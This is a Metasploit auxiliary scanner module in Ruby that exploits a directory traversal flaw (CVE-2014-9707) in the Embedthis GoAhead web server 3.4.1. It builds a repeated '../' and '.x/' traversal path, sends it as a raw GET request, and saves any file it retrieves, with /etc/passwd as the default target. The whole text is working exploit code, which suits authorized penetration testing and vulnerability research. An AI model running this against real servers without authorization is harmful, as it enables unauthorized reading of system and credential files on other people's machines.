##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Embedthis GoAhead Embedded Web Server Directory Traversal',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in the Embedthis
        GoAhead Web Server v3.4.1, allowing an attacker to read arbitrary files
        with the web server privileges.
      },
      'References'     =>
        [
          ['CVE', '2014-9707'],
          ['URL', 'http://packetstormsecurity.com/files/131156/GoAhead-3.4.1-Heap-Overflow-Traversal.html']
        ],
      'Author'         =>
        [
          'Matthew Daley', # Vulnerability discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('FILEPATH', [true, "The path to the file to read", "/etc/passwd"]),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 5 ])
      ], self.class)

    deregister_options('RHOST')
  end

  def run_host(ip)
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\//
    traversal = "../" * datastore['DEPTH'] << ".x/" * datastore['DEPTH'] << filename

    res = send_request_raw({
      'method' => 'GET',
      'uri'    => "#{traversal}"
    })

    if res &&
        res.code == 200 &&
        res.headers['Server'] &&
        res.headers['Server'] =~ /GoAhead/

      print_line("#{res.body}")

      fname = datastore['FILEPATH']

      path = store_loot(
        'goahead.traversal',
        'text/plain',
        ip,
        res,
        fname
      )

      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Nothing was downloaded")
    end
  end
end
